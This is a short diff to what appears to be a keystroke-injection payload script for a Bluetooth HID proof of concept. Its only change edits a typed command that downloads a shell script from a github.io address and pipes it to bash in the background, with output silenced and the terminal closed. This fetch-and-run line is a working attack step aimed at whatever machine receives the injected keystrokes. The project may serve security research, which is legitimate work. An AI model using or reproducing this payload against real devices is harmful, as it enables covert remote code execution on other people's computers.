@@ -5,5 +5,5 @@
 #
 # Format: GUI [key] | STRING <text> | ENTER | DELAY <ms> | # comment
 DELAY 300
-STRING nohup bash -c 'curl -sL whitewhidow.github.io/hid-ble-poc-web/pair.sh | bash -s {MAC}' >/dev/null 2>&1 & disown; exit
+STRING nohup bash -c 'curl -sL whitewhidow.github.io/hid-ble-poc/pair.sh | bash -s {MAC}' >/dev/null 2>&1 & disown; exit
 ENTER
